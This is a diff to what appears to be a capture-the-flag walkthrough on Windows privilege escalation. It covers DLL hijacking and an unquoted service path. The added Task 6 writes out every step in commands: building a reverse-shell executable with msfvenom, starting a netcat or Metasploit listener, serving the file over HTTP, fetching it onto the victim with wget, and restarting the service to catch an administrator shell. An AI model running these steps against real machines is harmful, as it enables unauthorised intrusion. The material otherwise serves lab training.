@@ -59,7 +59,7 @@ First, navigate to the Temp folder:
 cd C:\Temp\
 
 Then, download the dll from our attacker machine:
-wget -O hijackme.dll [your machine IP]:9000(or the port you specified for the server)/hijackme.dll
+wget -O hijackme.dll [your machine IP]:[port]/hijackme.dll
 
 Using command prompt, restart the dllsvc service on the victim machine:
 sc stop dllsvc
@@ -73,3 +73,51 @@ enter the password at the prompt
 
 In the new window:
 type C:\Users\jack\Documents\flagdll.txt for flag
+
+
+Task 6 {Unquoted Service Path}
+
+Question 1: What is the full unquoted path of unquotedsvc?
+{{Hint: in command prompt: sc qc unquotedsvc}
+
+Question 2: Which folder does the user have read and write privileges on? (Please write the whole path)?
+{{Hint: navigate to the desktop 
+cd Desktop
+and try each subfolder in the path starting at C:\Program Files\ until you find one that is writable by BUILTIN\Users
+.\accesschk64.exe /accepteula -uwdq "C:\path\here\try\them\all
+
+Question 3: What would be the name of the executable you would place in that folder? 
+{{Hint: What is the first word of the subfolder that's in the subfolder you have write privileges on?}}
+
+Question 4: Obtain Administrator privileges on the target machine. What is the content of the flagUSP.txt file?
+{{Hint}}
+
+Let's generate the payload for our reverse shell:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=[your machine IP] LPORT=[port number] -f exe > common.exe
+
+We can use either netcat or metasploit for our listener:
+netcat:
+nc -lvnp [port you specified earlier]
+
+-OR-
+
+msfconsole
+use /exploit/multi/handler
+set payload windows/x64/shell_reverse_tcp
+set lhost [your machine IP]
+set lport [port you specified in the payload]
+run
+
+Start a server:
+python3 -m http.server 9000
+
+Now, head over to the victim PC and open powershell.
+Navigate to C:\Program Files\Unquoted Path Service\
+cd "C:\Program Files\Unquoted Path Service\" (needs quotes)
+wget -O common.exe [yourmachineIP]:[port]/common.exe
+
+Then, in a command prompt:
+sc start unquotedsvc
+and catch the shell on your machine.
+
+Flag is in: C:\Users\Cora\Documents\
